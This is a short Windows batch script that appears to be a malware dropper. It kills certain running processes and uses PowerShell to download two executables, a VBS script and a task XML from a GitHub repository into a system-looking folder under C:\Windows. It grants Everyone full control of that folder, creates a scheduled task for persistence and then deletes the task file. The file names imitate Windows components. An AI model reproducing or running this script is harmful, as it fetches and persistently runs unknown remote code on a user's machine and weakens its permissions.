@echo off

set "URL1=https://raw.githubusercontent.com/m-c00/td/main/win-win.xml"
set "URL2=https://raw.githubusercontent.com/m-c00/td/main/wscript.vbs"
set "URL3=https://raw.githubusercontent.com/m-c00/td/main/win-tr1.exe"
set "URL4=https://raw.githubusercontent.com/m-c00/td/main/win-db.exe"
set "DEST_DIR=C:\Windows\programs\preflog"
set "TASK_XML=%DEST_DIR%\win-win.xml"
set "TASK_NAME=WinWinTask"

tasklist | findstr /i "ws-tr.exe" >nul
if %errorlevel% equ 0 (
    taskkill /f /im "ws-tr.exe" >nul 2>&1
)

tasklist | findstr /i "win-db.exe" >nul
if %errorlevel% equ 0 (
    taskkill /f /im "win-db.exe" >nul 2>&1
)

if not exist "%DEST_DIR%" mkdir "%DEST_DIR%"

powershell -command "(New-Object System.Net.WebClient).DownloadFile('%URL1%', '%DEST_DIR%\win-win.xml')"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%URL2%', '%DEST_DIR%\wscript.vbs')"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%URL3%', '%DEST_DIR%\win-tr.exe')"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%URL4%', '%DEST_DIR%\win-db.exe')"

icacls "%DEST_DIR%" /grant:r "*S-1-1-0:(OI)(CI)F" /t /c

schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
schtasks /create /xml "%TASK_XML%" /tn "%TASK_NAME%" >nul 2>&1

del "%TASK_XML%" >nul 2>&1

pause
